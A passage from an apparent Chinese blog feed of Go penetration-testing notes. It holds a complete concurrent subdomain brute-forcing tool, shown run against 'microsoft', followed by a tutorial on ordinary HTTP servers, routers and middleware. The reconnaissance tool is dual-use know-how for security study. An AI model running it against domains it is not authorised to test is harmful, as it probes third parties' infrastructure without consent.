class="line">fmt.Fprintf(w, <span class="string">&quot;%s\t%s\n&quot;</span>, r.Hostname, r.IPAddress)</span><br><span class="line">&#125;</span><br><span class="line">w.Flush()</span><br></pre></td></tr></table></figure><h3 id="8-完整程序"><a href="#8-完整程序" class="headerlink" title="8. 完整程序"></a>8. 完整程序</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;text/tabwriter&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/miekg/dns&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupA</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> ips []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;</span><br><span class="line">ips = <span class="built_in">append</span>(ips, a.A.String())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ips, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupCNAME</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> fqdns []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> c, ok := answer.(*dns.CNAME); ok &#123;</span><br><span class="line">fqdns = <span class="built_in">append</span>(fqdns, c.Target)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fqdns, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookup</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> []result &#123;</span><br><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line"><span class="keyword">var</span> cfqdn = fqdn <span class="comment">// Don&#x27;t modify the original.</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">cnames, err := lookupCNAME(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; <span class="built_in">len</span>(cnames) &gt; <span class="number">0</span> &#123;</span><br><span class="line">cfqdn = cnames[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">continue</span> <span class="comment">// We have to process the next CNAME.</span></span><br><span class="line">&#125;</span><br><span class="line">ips, err := lookupA(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// There are no A records for this hostname.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, ip := <span class="keyword">range</span> ips &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, result&#123;IPAddress: ip, Hostname: fqdn&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// We have processed all the results.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> results</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(tracker <span class="keyword">chan</span> empty, fqdns <span class="keyword">chan</span> <span class="type">string</span>, gather <span class="keyword">chan</span> []result, serverAddr <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> fqdn := <span class="keyword">range</span> fqdns &#123;</span><br><span class="line">results := lookup(fqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(results) &gt; <span class="number">0</span> &#123;</span><br><span class="line">gather &lt;- results</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> empty <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> result <span class="keyword">struct</span> &#123;</span><br><span class="line">IPAddress <span class="type">string</span></span><br><span class="line">Hostname  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">flDomain = flag.String(<span class="string">&quot;domain&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;要猜解的域名&quot;</span>)</span><br><span class="line">flWordlist = flag.String(<span class="string">&quot;wordlist&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;猜解所使用的字典&quot;</span>)</span><br><span class="line">flWorkerCount = flag.Int(<span class="string">&quot;c&quot;</span>,<span class="number">100</span>,<span class="string">&quot;所使用的线程&quot;</span>)</span><br><span class="line">flServerAddr = flag.String(<span class="string">&quot;Server&quot;</span>,<span class="string">&quot;8.8.8.8:53&quot;</span>,<span class="string">&quot;所使用的DNS服务器&quot;</span>)</span><br><span class="line">)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *flDomain == <span class="string">&quot;&quot;</span> || *flWordlist == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;-domain and -wordlist are required&quot;</span>)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line"></span><br><span class="line">fqdns := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, *flWorkerCount)</span><br><span class="line">gather := <span class="built_in">make</span>(<span class="keyword">chan</span> []result)</span><br><span class="line">tracker := <span class="built_in">make</span>(<span class="keyword">chan</span> empty)</span><br><span class="line"></span><br><span class="line">fh, err := os.Open(*flWordlist)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fh.Close()</span><br><span class="line">scanner := bufio.NewScanner(fh)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(tracker, fqdns, gather, *flServerAddr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> r := <span class="keyword">range</span> gather &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, r...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> scanner.Scan() &#123;</span><br><span class="line">fqdns &lt;- fmt.Sprintf(<span class="string">&quot;%s.%s&quot;</span>, scanner.Text(), *flDomain)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Note: We could check scanner.Err() here.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(fqdns)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line">&lt;-tracker</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(gather)</span><br><span class="line">&lt;-tracker</span><br><span class="line"></span><br><span class="line">w := tabwriter.NewWriter(os.Stdout, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;%s\t%s\n&quot;</span>, r.Hostname, r.IPAddress)</span><br><span class="line">&#125;</span><br><span class="line">w.Flush()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-使用"><a href="#9-使用" class="headerlink" title="9. 使用"></a>9. 使用</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> run .\main.<span class="keyword">go</span> -domain microsoft -wordlist namelist.txt -c <span class="number">1000</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220305110557.png"></p><h2 id="0x02-自己编写DNS服务器"><a href="#0x02-自己编写DNS服务器" class="headerlink" title="0x02 自己编写DNS服务器"></a>0x02 自己编写DNS服务器</h2><h3 id="1-实验环境搭建"><a href="#1-实验环境搭建" class="headerlink" title="1. 实验环境搭建"></a>1. 实验环境搭建</h3><p>在服务器上，这里选择使用<code>ubuntu</code>，安装好<code>docker</code></p><hr><p>先鸽一会，有点难，返回来学习</p>]]></content>
    
    
    <summary type="html">Go渗透测试中对于DNS的利用</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(四)</title>
    <link href="https://h0ld1rs.github.io/posts/13916.html"/>
    <id>https://h0ld1rs.github.io/posts/13916.html</id>
    <published>2022-03-02T03:46:28.000Z</published>
    <updated>2022-03-05T03:16:34.146Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试笔记-四-–HTTP服务器，路由，中间件"><a href="#Go渗透测试笔记-四-–HTTP服务器，路由，中间件" class="headerlink" title="Go渗透测试笔记(四)–HTTP服务器，路由，中间件"></a>Go渗透测试笔记(四)–HTTP服务器，路由，中间件</h1><h2 id="0x00-HTTP服务器基础"><a href="#0x00-HTTP服务器基础" class="headerlink" title="0x00 HTTP服务器基础"></a>0x00 HTTP服务器基础</h2><h3 id="1-构建一个简单的服务器"><a href="#1-构建一个简单的服务器" class="headerlink" title="1. 构建一个简单的服务器"></a>1. 构建一个简单的服务器</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter,r * http.Request)</span></span>&#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;Hello %s \n&quot;</span>,r.URL.Query().Get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/hello&quot;</span>,hello)</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,<span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是使用<code>HandleFunc</code>创建一个<code>Handler</code>，然后启动监听器访问即可</p><p>同时在写处理请求的时候，需要两个参数，一个是<code>http.ResponseWriter</code>，用于对请求的写入，另一个是<code>Request</code>类型的指针，它运训我们从传入的请求信息中去读取信息。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302120351.png"></p><blockquote><p>http.HandFunc()是怎么运行的？</p><p>由Go文档可知，处理程序被放置在<code>DefaultServerMux</code>上面，<code>ServerMux</code>是多路复用器(server multiplexer)的简写，它可以处理多模式函数的多个HTTP请求，它使用<code>gorountine</code>执行此操作。</p></blockquote><h3 id="2-构造一个简单路由器"><a href="#2-构造一个简单路由器" class="headerlink" title="2. 构造一个简单路由器"></a>2. 构造一个简单路由器</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> router <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *router)</span></span>ServeHTTP(w http.ResponseWriter,req *http.Request)  &#123;</span><br><span class="line"><span class="keyword">switch</span> req.URL.Path &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;/a&quot;</span>:</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;Executing /a&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;/b&quot;</span>:</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;Executing /b&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;/c&quot;</span>:</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;Executing /c&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">http.Error(w,<span class="string">&quot;404 not found&quot;</span>,<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> r router</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,&amp;r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里重写了<code>ServeHTTP</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302142529.png"></p><h3 id="3-构造一个简单的中间件"><a href="#3-构造一个简单的中间件" class="headerlink" title="3. 构造一个简单的中间件"></a>3. 构造一个简单的中间件</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> logger <span class="keyword">struct</span> &#123;</span><br><span class="line">Inner http.Handler</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *logger)</span></span>ServeHTTP(w http.ResponseWriter,r * http.Request) &#123;</span><br><span class="line">log.Println(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">l.Inner.ServeHTTP(w,r)</span><br><span class="line">log.Println(<span class="string">&quot;Finish&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter,r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Println(w,<span class="string">&quot;Hello\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">f := http.HandlerFunc(hello)</span><br><span class="line">l := logger&#123;Inner:f&#125;</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,&amp;l)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们创建了一个外部程序，该程序在每次请求时都会在服务器上记录一些信息，并调用函数<code>hello()</code>，我们将此日志逻辑包装在函数中。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302150042.png"></p><h3 id="4-使用-gorilla-x2F-mux-包进行路由"><a href="#4-使用-gorilla-x2F-mux-包进行路由" class="headerlink" title="4.使用 gorilla&#x2F;mux 包进行路由"></a>4.使用 gorilla&#x2F;mux 包进行路由</h3><p><code>gorilla/mux</code>是个成熟的第三方路由包，可以基于简单，复杂的模式进行路由。他包含正则表达式，参数匹配，动词匹配及子路由等其他功能</p><p>同时，我们需要先下载<code>gorilla/mux</code>包</p><blockquote><p>go get github.com&#x2F;gorilla&#x2F;mux</p></blockquote><p>现在，开始使用这个路由包，使用<code>mux.NewRouter()</code>创建路由器</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r := mux.NewRounter()</span><br></pre></td></tr></table></figure><p>返回的类型接口实现了<code>http.Handler</code>，但同时也具有许多其他关联的方法。其中，最长用的方法是：<code>HandleFunc()</code>，如果想定义新的路由来对<code>/foo</code>模式的<code>Get</code>请求，则可以使用如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r.HandleFunc(<span class="string">&quot;/foo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi foo&quot;</span>)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br></pre></td></tr></table></figure><p>由于调用了<code>Method()</code>，因此，只有<code>Get</code>请求才能匹配此路由。所有其他方法将返回404请求。可以在此之上链接其他限定符，例如，与特定主机头值匹配的<code>Host()</code>。以下内容仅返回与主机头设置为<code>www.foo1.com</code>的请求匹配</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.HandleFunc(<span class="string">&quot;/foo1&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi foo1&quot;</span>)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>).Host(<span class="string">&quot;www.foo1.com&quot;</span>)</span><br></pre></td></tr></table></figure><p>有时，在请求路径中匹配并传递参数会很有帮助。<code>gorilla/mux</code>很适合。</p><p>打印出请求路径在<code>user</code>之后的所有内容</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.HandleFunc(<span class="string">&quot;/user/&#123;user&#125;&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">user := mux.Vars(r)[<span class="string">&quot;user&quot;</span>]</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi %s\n&quot;</span>,user)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br></pre></td></tr></table></figure><p>在定义请求路径时，可以使用花括号定义请求参数。可以将此视为已经命名的占位符。然后再函数中调用<code>mux.Var()</code>，将请求对象传递给它。此时会返回<code>map [string]string</code></p><p>此外还可以使用正则表达式来限定传递的模式。例如，指定user的参数必须为小写字母</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.HandleFunc(<span class="string">&quot;/user/&#123;user:[a-z]+&#125;&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">user := mux.Vars(r)[<span class="string">&quot;user&quot;</span>]</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi %s\n&quot;</span>,user)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br></pre></td></tr></table></figure><p>完整的代码如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line"></span><br><span class="line">r.HandleFunc(<span class="string">&quot;/foo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi foo&quot;</span>)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.HandleFunc(<span class="string">&quot;/foo1&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi foo1&quot;</span>)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>).Host(<span class="string">&quot;www.foo1.com&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.HandleFunc(<span class="string">&quot;/user/&#123;user:[a-z]+&#125;&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">user := mux.Vars(r)[<span class="string">&quot;user&quot;</span>]</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi %s\n&quot;</span>,user)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br><span class="line"></span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-使用negroni包构建中间件"><a href="#5-使用negroni包构建中间件" class="headerlink" title="5. 使用negroni包构建中间件"></a>5. 